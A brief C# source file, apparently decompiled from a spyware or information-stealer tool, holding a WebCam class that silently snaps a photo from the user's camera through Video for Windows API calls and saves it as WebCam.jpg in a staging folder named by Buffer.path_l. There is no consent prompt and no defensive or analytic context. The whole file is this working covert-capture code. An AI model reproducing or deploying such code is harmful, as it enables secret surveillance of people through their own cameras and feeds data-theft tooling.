using System;
using System.IO;
using System.Runtime.InteropServices;

internal class WebCam
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}WebCam.jpg";
		try
		{
			IntPtr hWnd = WinApi.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 320, 240, 0, 0);
			WinApi.SendMessage(hWnd, 1034u, 0, 0);
			WinApi.SendMessage(hWnd, 1049u, 0, Marshal.StringToHGlobalAnsi(text).ToInt32());
			WinApi.SendMessage(hWnd, 1035u, 0, 0);
		}
		catch
		{
			File.WriteAllText(text, "");
		}
	}
}
